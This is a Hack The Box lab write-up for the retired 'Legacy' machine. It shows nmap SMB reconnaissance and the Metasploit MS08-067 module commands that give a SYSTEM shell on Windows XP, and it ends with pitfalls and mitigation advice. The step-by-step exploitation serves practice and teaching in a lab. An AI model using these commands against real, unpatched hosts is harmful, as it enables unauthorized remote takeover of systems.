---
machine: Legacy
os: Windows
difficulty: Easy
platform: Hack The Box
category: Windows / SMB
state: Retired
tags: [windows, smb, ms08-067, netapi, metasploit]
---

# Legacy — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

Windows XP with SMBv1 and only 139/445 open: **MS08-067** (`netapi32.dll`) gives remote execution as SYSTEM. It is the shortest box on the platform and a good drill for SMB recon and using a Metasploit module.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
```

```bash
nmap --script smb-os-discovery,smb-security-mode -p445 <IP>
nmap --script vuln -p445 <IP>
```

`smb-os-discovery` returns `Windows XP` and `message_signing: disabled`; the vulnerability script flags `MS08-067`.

## Access

```bash
msfconsole -q
msf6 > use exploit/windows/smb/ms08_067_netapi
msf6 > set RHOSTS <IP>
msf6 > set LHOST <IP>
msf6 > set RPORT 445
msf6 > run
```

```text
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

```text
meterpreter > cat "C:\Documents and Settings\Administrator\Desktop\root.txt"
```

Flags sit on `john`'s and `Administrator`'s desktops; compromise is immediate, with no escalation.

## Pitfalls

- **SMBv1 disabled on the client**: run `smbclient`/Metasploit from a VM with SMBv1 enabled or force negotiation.
- **`RPORT`**: the module must target 445, not 139.
- **Retries**: over a slow VPN the exploit fails the first time; repeat with `setg ExitOnSession false`.

## Lessons

- MS08-067 is unauthenticated remote execution on unpatched hosts: a vulnerability scan confirms it before attacking.
- A service running as SYSTEM needs no escalation.
- Mitigation: disable SMBv1, patch, and segment the network.
